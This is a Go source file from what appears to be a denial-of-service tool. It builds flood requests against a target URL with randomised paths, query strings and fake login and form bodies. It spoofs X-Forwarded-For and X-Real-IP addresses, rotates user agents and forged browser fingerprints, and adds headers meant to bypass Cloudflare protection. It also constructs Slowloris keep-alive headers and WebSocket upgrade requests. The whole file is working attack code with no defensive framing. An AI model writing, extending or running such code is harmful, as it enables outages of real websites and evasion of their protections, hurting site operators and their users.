package main
import (
	"bytes"
	"compress/zlib"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"io"
	mrand "math/rand"
	"net/http"
	"strings"
	"sync/atomic"
	"time"
)
type readCloser struct {
	io.Reader
	io.Closer
}
func buildRequest(method, target string, withBody bool, bypassMode int) (*http.Request, error) {
	var body io.Reader
	if withBody {
		bodyType := mrand.Intn(4)
		var bodyBytes []byte
		switch bodyType {
		case 0:
			bodyBytes = []byte(generateFakeJSON())
		case 1:
			bodyBytes = []byte(generateFakeForm())
		case 2:
			bodyBytes = []byte(generateLoginPayload())
		case 3:
			bodySize := 128 + mrand.Intn(512)
			bodyBytes = make([]byte, bodySize)
			for i := range bodyBytes {
				bodyBytes[i] = byte(mrand.Intn(94) + 33)
			}
		}
		body = strings.NewReader(string(bodyBytes))
	}
	path := randomPath()
	fullURL := target
	if !strings.Contains(target, "?") {
		fullURL = target + path + "?" + randomQueryString()
	} else {
		fullURL = target + "&" + randomQueryString()
	}
	req, err := http.NewRequest(method, fullURL, body)
	if err != nil {
		return nil, err
	}
	ua := randomUA()
	if bypassMode > 0 {
		ua = randomBypassUA()
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", randomAccept())
	req.Header.Set("Accept-Language", randomAcceptLang())
	req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	if mrand.Intn(2) == 0 {
		req.Header.Set("X-Forwarded-For", randomIPAddress())
	}
	if mrand.Intn(3) == 0 {
		req.Header.Set("X-Real-IP", randomIPAddress())
	}
	if mrand.Intn(4) == 0 {
		req.Header.Set("Referer", randomReferer())
	}
	if mrand.Intn(5) == 0 {
		req.Header.Set("Origin", targetURL)
	}
	if bypassMode > 0 {
		headerSet := cfBypassHeaders[mrand.Intn(len(cfBypassHeaders))]
		for i := 0; i < len(headerSet); i += 2 {
			req.Header.Set(headerSet[i], headerSet[i+1])
		}
		if bypassMode > 1 {
			for i := 0; i < len(stealthHeaders); i += 2 {
				if mrand.Intn(2) == 0 {
					val := stealthHeaders[i+1]
					if val == "" {
						val = fmt.Sprintf("%d", mrand.Intn(999999))
					}
					req.Header.Set(stealthHeaders[i], val)
				}
			}
		}
	}
	if withBody {
		contentTypes := []string{
			"application/x-www-form-urlencoded",
			"application/json",
		}
		req.Header.Set("Content-Type", contentTypes[mrand.Intn(len(contentTypes))])
	}
	return req, nil
}
func buildWSRequest() *http.Request {
	key := make([]byte, 16)
	rand.Read(key)
	req, _ := http.NewRequest("GET", targetURL+randomPath(), nil)
	req.Header.Set("Upgrade", "websocket")
	req.Header.Set("Connection", "Upgrade")
	req.Header.Set("Sec-WebSocket-Key", fmt.Sprintf("%x", key))
	req.Header.Set("Sec-WebSocket-Version", "13")
	req.Header.Set("User-Agent", randomBypassUA())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Sec-Fetch-Mode", "websocket")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	req.Header.Set("Origin", targetURL)
	req.Header.Set("Sec-CH-UA-Mobile", "?0")
	req.Header.Set("Sec-CH-UA-Platform", `"Windows"`)
	req.Header.Set("Sec-CH-UA", randomChromeVersion())
	return req
}
func doRequest(client *http.Client, req *http.Request) {
	resp, err := client.Do(req)
	if err != nil {
		atomic.AddUint64(&totalErrors, 1)
		if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "deadline exceeded") {
			atomic.AddUint64(&totalTimeout, 1)
		}
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	atomic.AddUint64(&totalRequests, 1)
	switch {
	case resp.StatusCode >= 200 && resp.StatusCode < 300:
		atomic.AddUint64(&total2xx, 1)
	case resp.StatusCode >= 300 && resp.StatusCode < 400:
		atomic.AddUint64(&total3xx, 1)
	case resp.StatusCode >= 400 && resp.StatusCode < 500:
		atomic.AddUint64(&total4xx, 1)
	case resp.StatusCode >= 500:
		atomic.AddUint64(&total5xx, 1)
	}
}
func buildSlowlorisHeaders() []string {
	headers := []string{
		fmt.Sprintf("Host: %s\r\n", cfg.targetHost),
		fmt.Sprintf("User-Agent: %s\r\n", randomBypassUA()),
		fmt.Sprintf("Accept: %s\r\n", randomAccept()),
		fmt.Sprintf("Accept-Language: %s\r\n", randomAcceptLang()),
		"Accept-Encoding: gzip, deflate, br, zstd\r\n",
		"Connection: keep-alive\r\n",
		fmt.Sprintf("Keep-Alive: timeout=%d, max=%d\r\n", 60+mrand.Intn(120), 50+mrand.Intn(200)),
		fmt.Sprintf("Sec-CH-UA: %s\r\n", randomChromeVersion()),
		"Sec-CH-UA-Mobile: ?0\r\n",
		fmt.Sprintf("Sec-CH-UA-Platform: \"%s\"\r\n", []string{"Windows", "macOS", "Linux"}[mrand.Intn(3)]),
		"Sec-Fetch-Dest: document\r\n",
		"Sec-Fetch-Mode: navigate\r\n",
		"Sec-Fetch-Site: none\r\n",
		"Sec-Fetch-User: ?1\r\n",
		"Upgrade-Insecure-Requests: 1\r\n",
	}
	if mrand.Intn(3) == 0 {
		headers = append(headers, fmt.Sprintf("Referer: %s\r\n", randomReferer()))
	}
	if mrand.Intn(2) == 0 {
		headers = append(headers, fmt.Sprintf("Origin: %s\r\n", targetURL))
	}
	if mrand.Intn(4) == 0 {
		headers = append(headers, fmt.Sprintf("X-Forwarded-For: %s\r\n", randomIPAddress()))
	}
	return headers
}
func randomUA() string {
	if cfg.userAgent != "" {
		return cfg.userAgent
	}
	return userAgents[mrand.Intn(len(userAgents))]
}
func randomBypassUA() string {
	if cfg.userAgent != "" {
		return cfg.userAgent
	}
	if len(userAgents) > 0 {
		return userAgents[mrand.Intn(len(userAgents))]
	}
	return cfBypassUserAgents[mrand.Intn(len(cfBypassUserAgents))]
}
func randomAccept() string {
	return acceptHeaders[mrand.Intn(len(acceptHeaders))]
}
func randomAcceptLang() string {
	return acceptLangHeaders[mrand.Intn(len(acceptLangHeaders))]
}
func randomPath() string {
	return attackPaths[mrand.Intn(len(attackPaths))]
}
func randomReferer() string {
	return refererList[mrand.Intn(len(refererList))]
}
func randomSearchTerm() string {
	return searchTerms[mrand.Intn(len(searchTerms))]
}
func randomChromeVersion() string {
	return chromeVersions[mrand.Intn(len(chromeVersions))]
}
func randomThinkTime() time.Duration {
	chance := mrand.Intn(100)
	if chance < PAGE_LOAD_CHANCE {
		return time.Duration(THINK_TIME_MIN_MS+mrand.Intn(THINK_TIME_MAX_MS-THINK_TIME_MIN_MS)) * time.Millisecond
	}
	return randomJitter()
}
func randomQueryString() string {
	params := []string{
		fmt.Sprintf("id=%d", mrand.Intn(999999)),
		fmt.Sprintf("q=%s", randomSearchTerm()),
		fmt.Sprintf("t=%d", time.Now().Unix()),
		fmt.Sprintf("rand=%x", mrand.Int63()),
		fmt.Sprintf("_=%d", time.Now().UnixNano()),
	}
	mrand.Shuffle(len(params), func(i, j int) { params[i], params[j] = params[j], params[i] })
	n := 2 + mrand.Intn(3)
	if n > len(params) {
		n = len(params)
	}
	return strings.Join(params[:n], "&")
}
func randomIPAddress() string {
	return fmt.Sprintf("%d.%d.%d.%d", mrand.Intn(223)+1, mrand.Intn(256), mrand.Intn(256), mrand.Intn(256))
}
func generateBrowserFingerprint() *BrowserFingerprint {
	ua := randomBypassUA()
	platforms := []string{"Win32", "MacIntel", "Linux x86_64"}
	langs := []string{"en-US", "en-GB", "id-ID", "ja-JP"}
	vendors := []string{"Google Inc.", "Intel Inc.", "NVIDIA Corporation"}
	renderers := []string{
		"ANGLE (Intel, Intel(R) UHD Graphics 630, OpenGL 4.5)",
		"ANGLE (NVIDIA, NVIDIA GeForce GTX 1050 Ti, OpenGL 4.5)",
		"ANGLE (Intel, Intel(R) Iris(R) Plus Graphics 640, OpenGL 4.1)",
	}
	return &BrowserFingerprint{
		CanvasHash:    fmt.Sprintf("%x", sha256.Sum256([]byte(fmt.Sprintf("%d-%d", mrand.Int63(), time.Now().UnixNano())))),
		WebGLVendor:   vendors[mrand.Intn(len(vendors))],
		WebGLRenderer: renderers[mrand.Intn(len(renderers))],
		Platform:      platforms[mrand.Intn(len(platforms))],
		Language:      langs[mrand.Intn(len(langs))],
		ScreenW:       []int{1920, 2560, 1366, 1440, 1536}[mrand.Intn(5)],
		ScreenH:       []int{1080, 1440, 768, 900, 864}[mrand.Intn(5)],
		ColorDepth:    24,
		PixelRatio:    1.0,
		HardwareConc:  []int{4, 8, 12, 16}[mrand.Intn(4)],
		DeviceMemory:  []int{4, 8, 16}[mrand.Intn(3)],
		UserAgent:     ua,
		Timestamp:     time.Now().UnixMilli(),
	}
}
func lzCompress(data []byte) []byte {
	var buf bytes.Buffer
	w, _ := zlib.NewWriterLevel(&buf, zlib.BestSpeed)
	w.Write(data)
	w.Close()
	return buf.Bytes()
}
func randomJitter() time.Duration {
	base := time.Duration(1+mrand.Intn(8)) * time.Millisecond
	jitter := time.Duration(mrand.Intn(5)) * time.Millisecond
	return base + jitter
}
func generateFakeJSON() string {
	templates := []func() string{
		func() string {
			return fmt.Sprintf(`{"name":"%s","email":"%s@test.com","password":"%s"}`,
				randomWord(6+mrand.Intn(8)), randomWord(4+mrand.Intn(6)), randomWord(8+mrand.Intn(8)))
		},
		func() string {
			return fmt.Sprintf(`{"query":"%s","page":%d,"limit":%d,"sort":"%s"}`,
				randomSearchTerm(), mrand.Intn(50), 10+mrand.Intn(40),
				[]string{"asc", "desc", "relevance", "date"}[mrand.Intn(4)])
		},
		func() string {
			return fmt.Sprintf(`{"action":"%s","id":%d,"token":"%s","timestamp":%d}`,
				[]string{"view", "click", "submit", "update", "delete"}[mrand.Intn(5)],
				mrand.Intn(999999), randomHex(16), time.Now().UnixNano()/int64(time.Millisecond))
		},
	}
	return templates[mrand.Intn(len(templates))]()
}
func generateLoginPayload() string {
	return fmt.Sprintf(`{"user":"%s@test.com","pass":"%s%s%d","method":"password","csrf":"%s"}`,
		randomWord(5+mrand.Intn(5)),
		randomWord(3+mrand.Intn(4)),
		[]string{"!", "@", "#", "$"}[mrand.Intn(4)],
		mrand.Intn(999),
		randomHex(8))
}
func randomWord(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[mrand.Intn(len(charset))]
	}
	return string(b)
}
func randomHex(length int) string {
	const charset = "0123456789abcdef"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[mrand.Intn(len(charset))]
	}
	return string(b)
}
func generateFakeForm() string {
	fields := []string{"username", "email", "password", "csrf", "action", "redirect", "lang"}
	vals := []string{"admin", "user@test.com", "pass123", "xk29f", "submit", "/", "en"}
	n := 2 + mrand.Intn(4)
	parts := make([]string, n)
	for i := 0; i < n; i++ {
		idx := mrand.Intn(len(fields))
		parts[i] = fmt.Sprintf("%s=%s", fields[idx], vals[idx])
	}
	return strings.Join(parts, "&")
}
